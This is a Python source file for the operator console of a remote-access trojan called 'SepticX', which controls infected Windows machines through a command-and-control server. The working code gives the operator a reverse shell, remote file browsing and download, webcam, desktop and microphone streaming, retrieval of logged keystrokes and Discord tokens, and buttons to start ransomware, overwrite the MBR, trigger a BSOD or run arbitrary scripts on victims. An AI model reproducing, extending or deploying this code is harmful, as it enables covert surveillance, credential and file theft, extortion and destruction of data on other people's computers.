from tkinter import *
from random import randbytes
from PIL import Image, ImageTk
from colorama import Style, Fore
from tkinter import filedialog as fd
from bit import SUPPORTED_CURRENCIES
from cryptography.fernet import Fernet
from websocket import create_connection
import multiprocessing, customtkinter, subprocess, websocket, threading, coincurve, requests, datetime, pyaudio, tkinter, shutil, base64, json, fade, time, glob, zlib, cv2, ssl, os, io

customtkinter.set_appearance_mode("dark")


class Profile(customtkinter.CTkFrame):
    def __init__(self, master, parent=None, config=None, row=0, rowspan=1, padx=20, pady=20, title=False):
        super().__init__(master)

        self.grid(row=row, rowspan=rowspan, column=0, columnspan=15, padx=padx, pady=pady, sticky="nsew")

        for i in range(1): # Set 1 rows
            self.rowconfigure(i, weight= 1)
        
        for i in range(7): # Set 7 columns
            self.columnconfigure(i, weight= 1)

        if title:
            emoji_widget = customtkinter.CTkButton(self, text="Country", fg_color="gray", text_color_disabled="Black", state="disabled", corner_radius=0)
            emoji_widget.grid(row=0, column=0, sticky="nsew", padx=0, pady=0)

            username_widget = customtkinter.CTkButton(self, text="Desktop Username", fg_color="gray", text_color_disabled="Black", state="disabled", corner_radius=0)
            username_widget.grid(row=0, column=1, columnspan=3, sticky="nsew", padx=0, pady=0)

            ip_address_widget = customtkinter.CTkButton(self, text="Ip Address", fg_color="gray", text_color_disabled="Black", state="disabled", corner_radius=0)
            ip_address_widget.grid(row=0, column=4, columnspan=2, sticky="nsew", padx=0, pady=0)

            address_widget = customtkinter.CTkButton(self, text="Other", fg_color="gray", text_color_disabled="Black", state="disabled", corner_radius=0)
            address_widget.grid(row=0, column=6, columnspan=2, sticky="nsew", padx=0, pady=0)
            return

        username = config['username']
        ip_address = config['ip_address']

        ipinfo = requests.get(f"https://ipinfo.io/{config['ip_address']}/json").json()
        response = requests.get(f"https://flagsapi.com/{ipinfo['country']}/flat/64.png")

        img = Image.open(io.BytesIO(response.content))
        image = customtkinter.CTkImage(dark_image=img, light_image=img)

        emoji_widget = customtkinter.CTkButton(self, text="", image=image, fg_color="White", text_color_disabled="Black", state="disabled", corner_radius=0)
        emoji_widget.grid(row=0, column=0, padx=0, sticky="nsew")

        username_widget = customtkinter.CTkButton(self, text=username, fg_color="White", text_color_disabled="Black", state="disabled", corner_radius=0)
        username_widget.grid(row=0, column=1, columnspan=3, sticky="nsew", padx=0, pady=0)

        ip_address_widget = customtkinter.CTkButton(self, text=ip_address, fg_color="White", text_color_disabled="Black", state="disabled", corner_radius=0)
        ip_address_widget.grid(row=0, column=4, columnspan=2, sticky="nsew", padx=0, pady=0)

        address_widget = customtkinter.CTkButton(self, text="More options", command=lambda: Controller(parent, f"{username}|{ip_address}"), corner_radius=0)
        address_widget.grid(row=0, column=6, columnspan=2, sticky="nsew", padx=0, pady=0)

class File(customtkinter.CTkFrame):
    def __init__(self, master, parent=None, filename="", config=None, row=0, rowspan=1, padx=20, pady=20, title=False):
        super().__init__(master)

        self.grid(row=row, rowspan=rowspan, column=0, columnspan=15, padx=padx, pady=pady, sticky="nsew")

        for i in range(1): # Set 1 rows
            self.rowconfigure(i, weight= 1)
        
        for i in range(7): # Set 7 columns
            self.columnconfigure(i, weight= 1)

        if title:
            emoji_widget = customtkinter.CTkButton(self, text="File Name", fg_color="gray", text_color_disabled="Black", state="disabled", corner_radius=0)
            emoji_widget.grid(row=0, column=0, sticky="nsew", padx=0, pady=0)

            username_widget = customtkinter.CTkButton(self, text="Date Modified", fg_color="gray", text_color_disabled="Black", state="disabled", corner_radius=0)
            username_widget.grid(row=0, column=1, columnspan=3, sticky="nsew", padx=0, pady=0)

            ip_address_widget = customtkinter.CTkButton(self, text="File Size", fg_color="gray", text_color_disabled="Black", state="disabled", corner_radius=0)
            ip_address_widget.grid(row=0, column=4, columnspan=2, sticky="nsew", padx=0, pady=0)

            address_widget = customtkinter.CTkButton(self, text="Return", fg_color="red", text_color_disabled="Black", command=lambda: threading.Thread(target=parent.list_directory, args=('\\'.join(parent.filename.split("\\")[:-1]),)).start(), corner_radius=10)
            address_widget.grid(row=0, column=6, columnspan=2, sticky="nsew", padx=0, pady=0)
            return

        date_modified = datetime.datetime.fromtimestamp(config['modified']).strftime("%Y/%m/%d %I:%M %p")
        file_size = config['file_size']

        if config['directory']:
            filename_widget = customtkinter.CTkButton(self, text=filename.split("\\")[-1], fg_color="White", text_color_disabled="Black", state="disabled", corner_radius=0)
            filename_widget.grid(row=0, column=0, padx=0, sticky="nsew")

            date_modified_widget = customtkinter.CTkButton(self, text=date_modified, fg_color="White", text_color_disabled="Black", state="disabled", corner_radius=0)
            date_modified_widget.grid(row=0, column=1, columnspan=3, sticky="nsew", padx=0, pady=0)

            file_size_widget = customtkinter.CTkButton(self, text=file_size, fg_color="White", text_color_disabled="Black", state="disabled", corner_radius=0)
            file_size_widget.grid(row=0, column=4, columnspan=2, sticky="nsew", padx=0, pady=0)

            view_widget = customtkinter.CTkButton(self, text="View Directory", command=lambda: threading.Thread(target=parent.list_directory, args=(filename,)).start(), corner_radius=0)
            view_widget.grid(row=0, column=6, columnspan=2, sticky="nsew", padx=0, pady=0)
            return

        filename_widget = customtkinter.CTkButton(self, text=filename.split("\\")[-1], fg_color="White", text_color_disabled="Black", state="disabled", corner_radius=0)
        filename_widget.grid(row=0, column=0, padx=0, sticky="nsew")

        date_modified_widget = customtkinter.CTkButton(self, text=date_modified, fg_color="White", text_color_disabled="Black", state="disabled", corner_radius=0)
        date_modified_widget.grid(row=0, column=1, columnspan=3, sticky="nsew", padx=0, pady=0)

        file_size_widget = customtkinter.CTkButton(self, text=file_size, fg_color="White", text_color_disabled="Black", state="disabled", corner_radius=0)
        file_size_widget.grid(row=0, column=4, columnspan=2, sticky="nsew", padx=0, pady=0)

        download_widget = customtkinter.CTkButton(self, text="Download", command=lambda: threading.Thread(target=parent.download, args=(filename,)).start(), corner_radius=0)
        download_widget.grid(row=0, column=6, columnspan=2, sticky="nsew", padx=0, pady=0)

class Controller(customtkinter.CTkFrame):
    def __init__(self, master, target):
        super().__init__(None)

        self.grid(row=1, column=0, padx=20, pady=0, sticky="nsew", columnspan=21, rowspan=18)
        self.server_address = master.server_address
        self.server_key = master.server_key
        self.ws = master.ws

        self.master = master

        for i in range(8): # Set 8 rows
            self.rowconfigure(i, weight= 1)
        
        for i in range(4): # Set 4 columns
            self.columnconfigure(i, weight= 1)

        btn = customtkinter.CTkButton(self, text="X", fg_color="#435250", command=lambda: self.destroy())
        btn.grid(row=0, column=0, columnspan=4, padx=5, pady=5, sticky="ew")

        frames = {
            "PC Management": [
                (None, 'Reverse Shell'),
                ('bsod', 'Start BSOD'),
                ('mbr', 'Overwrite MBR'),
                ('restart', 'Restart Pc'),
                ('shutdown', 'Shutdown Pc'),
            ],
            "Credentials": [
                ('sendCreds', 'Resend Credentials'),
                (None, 'Logged Tokens'),
                (None, 'Logged Keystrokes'),
                ('nukeTokens', 'Nuke Discord Tokens'),
                (None, 'Update Discord Webhook'),
            ], 
            "Streaming": [
                ('streamCamera', 'Stream Camera'),
                ('streamDesktop', 'Stream Desktop'),
                ('streamAudio', 'Stream Audio'),
                (None, 'File Manager')
            ],
            "Misc": [
                ('startRansomware', 'Start Ransomware'),
                (None, 'Show Message Box'),
                ('Troll', 'Start Trollware'),
                ('stopTroll', 'Stop Trollware'),
                (None, 'Run PY script'), 
                ('clean', 'Uninstall Client')
            ]
        }

        for count, (title, button_configs) in enumerate(frames.items()):

            frame = customtkinter.CTkFrame(self)
            frame.grid(row=1, column=count, rowspan=7, padx=20, pady=20, sticky="nsew")

            for i in range(6): # Set 6 rows
                frame.rowconfigure(i, weight= 1)
        
            for i in range(1): # Set 1 column
                frame.columnconfigure(i, weight= 1)

            label = customtkinter.CTkLabel(frame, text=title)
            label.grid(row=0, column=0, padx=20, pady=20, sticky="nsew")

            for count, (command, button_name) in enumerate(button_configs):

                if button_name == "Reverse Shell":
                    btn = customtkinter.CTkButton(
                        frame, text=button_name, 
                        command=lambda: Shell(master, target), 
                        fg_color="#1b6e63",
                        text_color="white"
                    )

                elif button_name == "Run PY script":
                    btn = customtkinter.CTkButton(
                        frame, text=button_name, 
                        command=lambda command=command: self.send_command(command, target, True), 
                        fg_color="#1b6e63",
                        text_color="white"
                    )

                elif button_name == "Update Discord Webhook":
                    btn = customtkinter.CTkButton(
                        frame, text=button_name, 
                        command=lambda: self.get_webhook_input("Enter your new Webhook", target), 
                        fg_color="#1b6e63",
                        text_color="white"
                    )

                elif button_name == "Show Message Box":
                    btn = customtkinter.CTkButton(
                        frame, text=button_name, 
                        command=lambda: self.get_message_box(target), 
                        fg_color="#1b6e63",
                        text_color="white"
                    )

                elif button_name == "Logged Tokens":
                    btn = customtkinter.CTkButton(
                        frame, text=button_name, 
                        command=self.download_tokens, 
                        fg_color="#1b6e63",
                        text_color="white"
                    )

                elif button_name == "Logged Keystrokes":
                    btn = customtkinter.CTkButton(
                        frame, text=button_name, 
                        command=self.download_keylogs, 
                        fg_color="#1b6e63",
                        text_color="white"
                    )

                elif command == "streamCamera":
                    btn = customtkinter.CTkButton(
                        frame, text=button_name, 
                        command=lambda command=command: (self.send_command(command, target), Video(master, target, 0)), 
                        fg_color="#1b6e63",
                        text_color="white"
                    )

                elif command == "streamDesktop":
                    btn = customtkinter.CTkButton(
                        frame, text=button_name, 
                        command=lambda command=command: (self.send_command(command, target), Video(master, target, 1)), 
                        fg_color="#1b6e63",
                        text_color="white"
                    )

                elif command == "streamAudio":
                    btn = customtkinter.CTkButton(
                        frame, text=button_name, 
                        command=lambda command=command: (self.send_command(command, target), Audio(master, target)), 
                        fg_color="#1b6e63",
                        text_color="white"
                    )

                elif button_name == "File Manager":
                    btn = customtkinter.CTkButton(
                        frame, text=button_name, 
                        command=lambda command=command: FileManager(master, target), 
                        fg_color="#1b6e63",
                        text_color="white"
                    )

                else:
                    btn = customtkinter.CTkButton(frame, text=button_name, command=lambda command = command: (self.send_command(command, target), tkinter.messagebox.showinfo("SepticX Client", "Successfully executed command")), fg_color="#1b6e63",
                        text_color="white")

                btn.grid(row=count + 1, column=0, padx=20, pady=5, sticky="ew")

    def send_message_box(self, frame, title, message, target):
        messagebox = self.messagebox
        self.send_command(f"messageBox|{messagebox}|{title}|{message}", target)

        tkinter.messagebox.showinfo("SepticX Client", "Successfully sent MessageBox")

        frame.destroy()

    def set_message_box(self, messagebox):
        self.messagebox = messagebox

    def get_message_box(self, target):
        cover_frame = customtkinter.CTkFrame(None)
        cover_frame.grid(row=1, column=0, padx=20, pady=0, sticky="nsew", columnspan=21, rowspan=18)

        for i in range(11): # Set 11 rows
            cover_frame.rowconfigure(i, weight= 1)
        
        for i in range(3): # Set 1 columns
            cover_frame.columnconfigure(i, weight= 1)

        btn = customtkinter.CTkButton(cover_frame, text="X", fg_color="#435250", command=cover_frame.destroy)
        btn.grid(row=0, column=0, columnspan=3, padx=5, pady=5, sticky="nsew")

        self.messagebox = "Error"

        messageboxes = [
            "Error",
            "Question",
            "Warning"
        ]

        label = customtkinter.CTkLabel(cover_frame, text="Select a message box type")
        label.grid(row=2, columnspan=3, pady=20)
        
        for count, messagebox in enumerate(messageboxes):
            pil_image = Image.open(f"assets\\{messagebox}.png")
            image = customtkinter.CTkImage(dark_image=pil_image, light_image=pil_image)

            btn = customtkinter.CTkButton(cover_frame, text=messagebox, image=image, command=lambda count=count: self.set_message_box(count))
            btn.grid(row=3, column=count, padx=20, stick="nsew")

        title = customtkinter.CTkEntry(cover_frame, placeholder_text="Enter MessageBox Title")
        title.grid(row=5, column=1, pady=20, stick="nsew")

        message = customtkinter.CTkEntry(cover_frame, placeholder_text="Enter MessageBox Message")
        message.grid(row=6, column=1, pady=20, stick="nsew")

        submit = customtkinter.CTkButton(cover_frame, text="Send MessageBox", command=lambda: self.send_message_box(cover_frame, title.get(), message.get(), target))
        submit.grid(row=8, column=1, pady=20, stick="nsew")

    def download_keylogs(self):
        tkinter.messagebox.showinfo("SepticX Client", "Downloading logs...")
        download = requests.get(f'https://{self.server_address}/logs', data={'key': self.server_key}).content

        with open('logs.zip', 'wb') as file:
            file.write(download)

        tkinter.messagebox.showinfo("SepticX Client", "Logs downloaded to logs.zip")

    def download_tokens(self):
        tkinter.messagebox.showinfo("SepticX Client", "Downloading logs...")
        tokens = requests.get(f'https://{self.server_address}/tokens', data={'key': self.server_key}).json()

        with open('tokens.txt', 'w+') as file:
            file.write('\n'.join(tokens))

        tkinter.messagebox.showinfo("SepticX Client", "Tokens downloaded to tokens.txt")

    def update_webhook(self, frame, webhook, target):
        self.send_command(f"updateWebhook|{webhook}", target)
        tkinter.messagebox.showinfo("SepticX Client", "Successfully updated webhook")
        
        frame.destroy()

    def get_webhook_input(self, query, target):
        cover_frame = customtkinter.CTkFrame(None)
        cover_frame.grid(row=1, column=0, padx=20, pady=0, sticky="nsew", columnspan=21, rowspan=18)

        for i in range(11): # Set 11 rows
            cover_frame.rowconfigure(i, weight= 1)
        
        for i in range(11): # Set 11 columns
            cover_frame.columnconfigure(i, weight= 1)

        btn = customtkinter.CTkButton(cover_frame, text="X", fg_color="#435250", command=cover_frame.destroy)
        btn.grid(row=0, column=0, columnspan=11, padx=5, pady=5, sticky="nsew")

        entry = customtkinter.CTkEntry(cover_frame, placeholder_text=query)
        entry.grid(row=5, column=3, columnspan=3, sticky="nsew")

        submit = customtkinter.CTkButton(cover_frame, text=query, command=lambda: self.update_webhook(cover_frame, entry.get(), target))
        submit.grid(row=5, column=6, columnspan=3, sticky="nsew")

    def send_command(self, command, target, file_prompt=False):
        if file_prompt:
            filetypes = (
                ('All files', '*'),
            )

            filename = fd.askopenfilename(
                title='Open a file',
                initialdir='/',
                filetypes=filetypes
            )

            if not filename:
                return

            command = open(filename, 'r+').read()

        self.ws.send(json.dumps({
            "code": command,
            "target": target
        }))


class Video(customtkinter.CTkFrame):
    def __init__(self, master, target, option=None):
        super().__init__(None)

        self.server_address = master.server_address
        self.server_key = master.server_key
        self.target = target
        self.ws = master.ws

        if not option:
            self.endpoint = "showCamera"
        else:
            self.endpoint = "showScreen"

        self.grid(row=1, column=0, padx=20, pady=0, sticky="nsew", columnspan=21, rowspan=18)

        btn = customtkinter.CTkButton(self, text="X", fg_color="#435250", command=self.kill_proc)
        btn.grid(row=0, column=0, columnspan=4, padx=5, pady=5, sticky="ew")

        for i in range(11): # Set 11 rows
            self.rowconfigure(i, weight= 1)
        
        for i in range(1): # Set 1 columns
            self.columnconfigure(i, weight= 1)

        screen = customtkinter.CTkLabel(self, text="")
        screen.grid(row=1, column=0, rowspan=10, sticky="nsew")

        self.screen = screen
        threading.Thread(target=self.get_display).start()
        self.after(0, self.update_display)

    def update_display(self):
        try:
            self.image
        except AttributeError:
            self.after(50, self.update_display)
            return

        image = customtkinter.CTkImage(dark_image=self.image, light_image=self.image, size=(1052, 592))
        self.screen.configure(image=image)
        self.after(50, self.update_display)

    def get_display(self):
        while True:
            try:
                recv_data = ws.recv()
                data = zlib.decompress(base64.b64decode(recv_data))
            except (websocket.WebSocketException, ValueError, NameError) as e:
                ws = self.connect()
                continue

            self.image = Image.open(io.BytesIO(data))

    def connect(self):
        while True:
            try:
                ws = create_connection(f"wss://{self.server_address}/api/ws/{self.endpoint}")
                ws.send(self.server_key)
                ws.send(self.target)
                return ws
            except (websocket.WebSocketException, WindowsError):
                pass

    def kill_proc(self):
        command = self.endpoint.replace('show', 'stop').replace('Screen', 'Desktop')

        self.ws.send(json.dumps({
            "code": command,
            "target": self.target
        }))

        self.stop = True
        self.destroy()


class Audio(customtkinter.CTkFrame):
    def __init__(self, master, target):
        super().__init__(None)

        self.server_address = master.server_address
        self.server_key = master.server_key
        self.target = target
        self.ws = master.ws
        self.stop = False

        self.grid(row=1, column=0, padx=20, pady=0, sticky="nsew", columnspan=21, rowspan=18)

        btn = customtkinter.CTkButton(self, text="X", fg_color="#435250", command=self.kill_proc)
        btn.grid(row=0, column=0, padx=5, pady=5, sticky="nsew")

        for i in range(11): # Set 11 rows
            self.rowconfigure(i, weight= 1)
        
        for i in range(1): # Set 1 columns
            self.columnconfigure(i, weight= 1)

        screen = customtkinter.CTkLabel(self, text="Listening to audio...")
        screen.grid(row=1, column=0, rowspan=10, sticky="nsew")

        self.screen = screen
        threading.Thread(target=self.play_audio).start()

    def play_audio(self):
        chunk = 1024
        FORMAT = pyaudio.paInt16
        CHANNELS = 1
        RATE = 8000
        RECORD_SECONDS = 5
        p = pyaudio.PyAudio()

        stream = p.open(format = FORMAT,
            channels = CHANNELS,
            rate = RATE,
            input = True,
            output = True,
            frames_per_buffer = chunk)
        
        while not self.stop:
            try:
                stream.write(zlib.decompress(base64.b64decode(ws.recv())))
            except:
                ws = self.connect()

    def connect(self):
        while True:
            try:
                ws = create_connection(f"wss://{self.server_address}/api/ws/playAudio")
                ws.send(self.server_key)
                ws.send(self.target)
                return ws
            except (websocket.WebSocketException, WindowsError):
                pass

    def kill_proc(self):
        self.ws.send(json.dumps({
            "code": "stopAudio",
            "target": self.target
        }))

        self.stop = True
        self.destroy()


class Shell(customtkinter.CTkFrame):
    def __init__(self, master, target):
        super().__init__(None)

        self.server_address = master.server_address
        self.server_key = master.server_key
        self.target = target
        self.stop = False
        self.ws = self.connect()
        self.row = 0

        self.grid(row=1, column=0, padx=20, pady=0, sticky="nsew", columnspan=21, rowspan=18)

        for i in range(11): # Set 11 rows
            self.rowconfigure(i, weight= 1)
        
        for i in range(1): # Set 1 columns
            self.columnconfigure(i, weight= 1)

        btn = customtkinter.CTkButton(self, text="X", fg_color="#435250", command=self.kill_proc)
        btn.grid(row=0, column=0, columnspan=4, padx=5, pady=5, sticky="ew")

        terminal_frame = customtkinter.CTkTextbox(self)
        terminal_frame.grid(row=1, column=0, rowspan=10, columnspan=4, sticky="nsew")

        terminal_frame.configure(state="disabled")

        self.terminal_frame = terminal_frame

        text_variable = StringVar(value="")

        entry = customtkinter.CTkEntry(self, placeholder_text="Enter command", textvariable=text_variable)
        entry.grid(row=11, column=0, columnspan=3, padx=5, pady=5, sticky="nsew")

        self.entry = text_variable

        submit = customtkinter.CTkButton(self, text="Submit", command=lambda: threading.Thread(target=self.run_command).start())
        submit.grid(row=11, column=3, padx=5, pady=5, sticky="nsew")

    def kill_proc(self):
        self.stop = True
        self.destroy()
        self.ws.close()

    def get_command_output(self, command):
        ws = self.ws
        
        while True:
            try:
                ws.send(command)
                break
            except (websocket.WebSocketException, WindowsError):
                ws = self.connect()

        while True:
            try:
                recv = ws.recv()
            except (websocket.WebSocketException, WindowsError):
                ws = self.connect()

            if recv == '\n':
                break

            yield recv.rstrip('\n')

    def run_command(self):
        command = self.entry.get()

        self.entry.set("")

        if not command:
            return
        
        while True:
            try:
                current_directory = [line for line in self.get_command_output("echo %cd%")][0][:-1]
                break
            except IndexError:
                pass

        self.add_text(f"{current_directory}>{command}")

        for line in self.get_command_output(command):
            self.add_text(line)

    def add_text(self, text):
        self.row += 1

        self.terminal_frame.configure(state="normal")
        self.terminal_frame.insert(f"{self.row}.0", text + "\n")
        self.terminal_frame.configure(state="disabled")

    def connect(self):
        while True:
            try:
                ws = create_connection(f"wss://{self.server_address}/api/ws/readShell")
                ws.send(self.server_key)
                ws.send(self.target)
                self.ws = ws
                return ws
            except (websocket.WebSocketException, WindowsError):
                pass


class FileManager(customtkinter.CTkFrame):
    def __init__(self, master, target):
        super().__init__(None)

        self.server_address = master.server_address
        self.server_key = master.server_key
        self.target = target
        self.stop = False
        self.ws = self.connect()
        self.filename = ""

        self.grid(row=1, column=0, padx=20, pady=0, sticky="nsew", columnspan=21, rowspan=18)

        for i in range(11): # Set 11 rows
            self.rowconfigure(i, weight= 1)
        
        for i in range(1): # Set 1 columns
            self.columnconfigure(i, weight= 1)

        btn = customtkinter.CTkButton(self, text="X", fg_color="#435250", command=self.kill_proc)
        btn.grid(row=0, column=0, columnspan=1, padx=5, pady=5, sticky="ew")

        scrollable_frame = customtkinter.CTkScrollableFrame(self, label_text="Current Directory")

        for i in range(15): # Set 15 rows
            scrollable_frame.rowconfigure(i, weight=1)
        
        for i in range(15): # Set 15 columns
            scrollable_frame.columnconfigure(i, weight=1)

        scrollable_frame.grid(row=1, column=0, rowspan=10, columnspan=1, sticky="nsew")

        scrollable_frame.grid(row=1, column=0, padx=20, pady=0, sticky="nsew", columnspan=1, rowspan=10)

        File(master=scrollable_frame, parent=self, title=True, pady=1)

        self.scrollable_frame = scrollable_frame
        threading.Thread(target=self.list_directory, args=("C:\\",)).start()

    def kill_proc(self):
        self.stop = True
        self.destroy()
        self.ws.close()

    def connect(self):
        while True:
            try:
                ws = create_connection(f"wss://{self.server_address}/api/ws/readFiles")
                ws.send(self.server_key)
                ws.send(self.target)
                self.ws = ws
                return ws
            except (websocket.WebSocketException, WindowsError):
                pass

    def download(self, file_path):
        self.ws.send(f"send_file|{file_path}")

        filename = file_path.split('\\')[-1]
        filename = f"downloads\\{filename}"
        
        offset = 0
        while True:
            if os.path.exists(filename):
                filename = filename[:filename.rindex('.')] + f" ({offset})" + filename[filename.rindex('.'):]
                offset += 1
                continue

            open(filename, 'w+').close()
            break

        with open(filename, 'ab') as file:
            while True:
                try:
                    data = self.ws.recv()
                    if data == "FIN":
                        break

                    print(data)
                    
                    data = data.replace('data|', '')

                    try:
                        file.write(zlib.decompress(base64.b64decode(data)))
                    except zlib.error as z:
                        print(z)

                    self.ws.send("ACK")
                except (websocket.WebSocketException, WindowsError):
                    break

    def list_directory(self, directory):
        for child in self.scrollable_frame.winfo_children()[1:]:
            try:
                child.destroy()
            except:
                pass

        self.scrollable_frame.configure(label_text=directory.replace("\\\\", "\\"))
        self.filename = directory

        while True:
            try:
                path = directory
                self.ws.send(f"listdir|{path}")
                recv_data = self.ws.recv()
                file_info = json.loads(recv_data)
                break
            except (websocket.WebSocketException, WindowsError):
                self.connect()

            except json.JSONDecodeError:
                continue

        row = 0
        for file in list(file_info):
            config = file_info[file]
            print(config)
            row += 1
            File(master=self.scrollable_frame, parent=self, filename=file, config=config, row=row, rowspan=1, pady=1)

        
class App(customtkinter.CTk):
    def __init__(self):
        os.system('')
        self.banner()

        super().__init__()

        self.geometry("1100x600")
        self.computers = []

        for i in range(21): # Set 21 rows
            self.rowconfigure(i, weight= 1)
        
        for i in range(18): # Set 18 columns
            self.columnconfigure(i, weight= 1)

        pil_image = Image.open("assets\\Title.png")
        image = customtkinter.CTkImage(dark_image=pil_image, light_image=pil_image, size=(400, 90))

        title = customtkinter.CTkLabel(self, image=image, text="")
        title.grid(row=0, column=0, columnspan=24, sticky="nsew")

        self.get_address()

    def get_address(self):
        key_frame = customtkinter.CTkFrame(self)
        key_frame.grid(row=1, column=6, padx=20, pady=20, sticky="nsew", columnspan=6, rowspan=18)
        
        for i in range(17): # Set 17 rows
            key_frame.rowconfigure(i, weight= 1)
        
        for i in range(17): # Set 17 columns
            key_frame.columnconfigure(i, weight= 1)

        server_address_entry = customtkinter.CTkEntry(key_frame, placeholder_text='Enter Server Address', justify=CENTER)
        server_address_entry.grid(row=7, column=0, columnspan=17, padx=20, pady=10, sticky="nsew")

        server_key_entry = customtkinter.CTkEntry(key_frame, placeholder_text='Enter Server Key', justify=CENTER)
        server_key_entry.grid(row=8, column=0, columnspan=17, padx=20, pady=10, sticky="nsew")

        response_label = customtkinter.CTkLabel(key_frame, text="")
        response_label.grid(row=15, column=4, columnspan=10, padx=0, pady=0, sticky="ew")

        submit = customtkinter.CTkButton(
            key_frame, text='Submit', 
            command=lambda: self.connect_to_server(
                server_address_entry.get(), 
                server_key_entry.get(), 
                response_label
            )
        )
        submit.grid(row=14, column=4, columnspan=10, padx=20, pady=20, sticky="ew")

    def connect_to_server(self, server_address, server_key, label):
        server_address = server_address.replace('https://', '') \
            .replace('http://', '') \
            .replace('wss://', '') \
            .replace('ws://', '') \
            .split('/')[0]

        try:
            ws = create_connection(f"wss://{server_address}/api/ws/computers", sslopt={"cert_reqs": ssl.CERT_NONE})
        except (websocket.WebSocketException, ValueError) as e:
            label.configure(text='Invalid Server Address')
            return

        ws.send(server_key)
        time.sleep(1)

        try:
            self.computers = json.loads(ws.recv())
        except (websocket.WebSocketException, ValueError, json.JSONDecodeError) as e:
            label.configure(text='Invalid Server Key')
            return

        if not (ws.connected):
            label.configure(text='Invalid Server Key')
            return

        self.ws = ws
        self.server_key = server_key
        self.server_address = server_address

        label.configure(text='Success!')

        for child in self.winfo_children()[1:]:
            child.destroy()

        threading.Thread(target=self.update_computers).start()
        self.menu()

    def update_computers(self):
        ws = self.ws

        while True:
            try:
                self.computers = json.loads(ws.recv())
            except json.JSONDecodeError:
                pass

            except (websocket.WebSocketException, TypeError, PermissionError, ConnectionError) as e:
                try:
                    ws.close()
                except (websocket.WebSocketException, PermissionError, ConnectionError):
                    pass

                print(e)

                try:
                    ws = create_connection(f"wss://{self.server_address}/api/ws/computers")
                    ws.send(self.server_key)
                except (json.JSONDecodeError, websocket.WebSocketException, PermissionError, ConnectionError) as e:
                    print(e)

            print(self.computers)

            self.ws = ws

    def update_profiles(self, main_frame, computers=[]):
        if computers == self.computers:
            self.after(10000, self.update_profiles, main_frame, computers)
            return

        computers = list(self.computers)

        for child in main_frame.winfo_children()[1:]:
            child.destroy()

        for computer in self.computers:

            username, ip_address = computer.split('|')
            config = {"username": username, "ip_address": ip_address}
            Profile(master=main_frame, parent=self, config=config, row=1, rowspan=1, pady=1)

        self.after(0, self.update_profiles, main_frame, computers)

    def menu(self):
        main_frame = customtkinter.CTkScrollableFrame(self, label_text="Clients")

        for i in range(15): # Set 15 rows
            main_frame.rowconfigure(i, weight=1)
        
        for i in range(15): # Set 15 columns
            main_frame.columnconfigure(i, weight=1)

        main_frame.grid(row=1, column=0, padx=20, pady=0, sticky="nsew", columnspan=21, rowspan=18)

        Profile(master=main_frame, title=True, pady=1)

        self.after(0, self.update_profiles, main_frame)

    @staticmethod
    def banner():
        print(fade.greenblue("""
   ▄████████    ▄████████    ▄███████▄     ███      ▄█   ▄████████ ▀████    ▐████▀ 
  ███    ███   ███    ███   ███    ███ ▀█████████▄ ███  ███    ███   ███▌   ████▀  
  ███    █▀    ███    █▀    ███    ███    ▀███▀▀██ ███▌ ███    █▀     ███  ▐███    
  ███         ▄███▄▄▄       ███    ███     ███   ▀ ███▌ ███           ▀███▄███▀    
▀███████████ ▀▀███▀▀▀     ▀█████████▀      ███     ███▌ ███           ████▀██▄     
         ███   ███    █▄    ███            ███     ███  ███    █▄    ▐███  ▀███    
   ▄█    ███   ███    ███   ███            ███     ███  ███    ███  ▄███     ███▄  
 ▄████████▀    ██████████  ▄████▀         ▄████▀   █▀   ████████▀  ████       ███▄ 
        """))

if __name__ == "__main__":
    app = App()
    app.mainloop()